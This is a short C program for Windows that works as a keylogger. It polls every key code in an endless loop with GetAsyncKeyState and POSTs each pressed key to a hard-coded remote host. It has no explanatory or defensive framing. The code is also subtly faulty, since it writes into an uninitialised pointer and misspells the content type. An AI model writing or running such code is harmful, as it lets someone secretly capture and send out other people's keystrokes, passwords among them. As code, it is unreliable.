#include <stdio.h>
#include <windows.h>
#include "lib/http.h"

#define HOST "example.com"

int main(){
  while(1){
    for(int i = 0;i < 255;i++){
      short state = GetAsyncKeyState(i);
      if(state == -32767){
        char *data;

        sprintf(data,"%d",i);

        printf("%d\n",i);

        request("POST",HOST,"80","/","text/plane",data);
      }
      Sleep(10);
    }
  }

  return 0;
}